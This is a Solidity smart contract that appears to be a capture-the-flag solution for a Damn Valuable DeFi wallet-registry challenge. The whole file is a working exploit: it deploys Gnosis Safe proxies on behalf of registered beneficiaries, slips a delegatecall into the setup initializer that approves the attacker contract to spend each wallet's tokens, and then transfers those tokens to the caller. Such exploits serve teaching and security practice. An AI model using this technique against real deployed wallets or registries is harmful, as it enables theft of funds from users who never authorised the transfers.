//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";

contract WalletAttacker {
    address private immutable masterCopy;
    address private immutable walletFactory;
    address private immutable registry;
    DamnValuableToken private immutable dvt;

    constructor(
        address _mastercopy,
        address _walletfactory,
        address _registry,
        address _token
    ) {
        masterCopy = _mastercopy;
        walletFactory = _walletfactory;
        registry = _registry;
        dvt = DamnValuableToken(_token);
    }

    /**
     * @dev approves the spender to spend tokens
     * @param _spender spender to approve
     */
    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        //Create a wallet for every registered user
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            //Create the data that will be passed to the proxyCreated function on walletRegistry
            //The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, //selector for the setuo() function call
                beneficiary, //_owners => List of SafeOwners
                1, // _threshold => Number of required confirmation for a Safe transaction
                address(this), //to => contract address for optional delegal call
                abi.encodeWithSignature(
                    "delegateApprove(address)",
                    address(this)
                ), //data => data payload for optional delegatecall
                0, //payment token => token that should be used for payment (0 is eth)
                0, //payment => value that should be paid
                0 //paymentReceiver => address that should receive the payment (or 0 if tx.origin)
            );

            //create new proxies on behalf of other users
            GnosisSafeProxy _newProxy = GnosisSafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    masterCopy, //_singleton => address of singleton contract
                    _initializer, //initializer => payload for message call sent to new proxy contract.abi
                    i, //saltNonce => nonce that will be used to generate the salt to calculate the address of the new proxy contract
                    IProxyCreationCallback(registry) //callback => Function that will be called after a new proxy contract is called and initialized
                );

            //Transfer to caller
            dvt.transferFrom(address(_newProxy), msg.sender, 10 ether);
        }
    }
}
